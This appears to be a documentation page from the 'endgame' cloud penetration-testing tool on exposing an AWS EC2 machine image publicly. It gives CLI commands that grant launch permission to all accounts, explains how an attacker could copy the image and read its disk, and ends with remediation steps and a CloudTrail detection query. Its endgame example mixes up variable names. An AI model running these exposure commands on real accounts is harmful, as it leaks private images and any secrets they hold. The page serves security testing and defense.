# EC2 AMIs (Machine Images)

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=*
export IMAGE_ID=ami-5731123e

endgame expose --service ebs --name $SNAPSHOT_ID
```

* To expose the resource using AWS CLI, run the following from the victim account:

```bash
aws ec2 modify-image-attribute \
    --image-id ami-5731123e \
    --launch-permission "Add=[{Group=all}]"
```

* To validate that the resource has been shared publicly, run the following:

```bash
aws ec2 describe-image-attribute \
    --image-id ami-5731123e \ 
    --attribute launchPermission
```

* Observe that the contents of the exposed AMI match the example shown below.

## Example

The output of `aws ec2 describe-image-attribute` reveals that the AMI is public if the value of "Group" under "LaunchPermissions" is equal to "all"

```
{
    "LaunchPermissions": [
        {
            "Group": "all"
        }
    ],
    "ImageId": "ami-5731123e",
}
```

## Exploitation

After an EC2 AMI is made public, an attacker can then:
* [Copy the AMI](https://docs.aws.amazon.com/cli/latest/reference/ec2/copy-image.html) into their own account
* Launch an EC2 instance using that AMI and browse the contents of the disk, potentially revealing sensitive or otherwise non-public information.

## Remediation

> ‼️ **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. **We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool**. 😊

* **Encrypt all AMIs with Customer-Managed Keys**: Follow the encryption-related recommendations in the [Prevention Guide](https://endgame.readthedocs.io/en/latest/prevention/#use-aws-kms-customer-managed-keys)
* **Trusted Accounts Only**: Ensure that EC2 AMIs are only shared with trusted accounts, and that the trusted accounts truly need access to the EC2 AMIs.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **Restrict access to IAM permissions that could lead to exposure of your AMIs**: Tightly control access to the following IAM actions:
      - [ec2:ModifyImageAttribute](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_ModifyImageAttribute.html): _Grants permission to modify an attribute of an Amazon Machine Image (AMI)_
      - [ec2:DescribeImageAttribute](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeImageAttribute.html): _Grants permission to describe an attribute of an Amazon Machine Image (AMI). This includes information on which accounts have access to the AMI_
      - [ec2:DescribeImages](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeImages.html): _Grants permission to describe one or more images (AMIs, AKIs, and ARIs)_

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent
| filter eventSource='ec2.amazonaws.com' and (eventName='ModifyImageAttribute' and requestParameters.attributeType='launchPermission') 
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

- [aws ec2 modify-image-attribute](https://docs.aws.amazon.com/cli/latest/reference/ec2/modify-image-attribute.html)
- [aws ec2 describe-image-attribute](https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-image-attribute.html)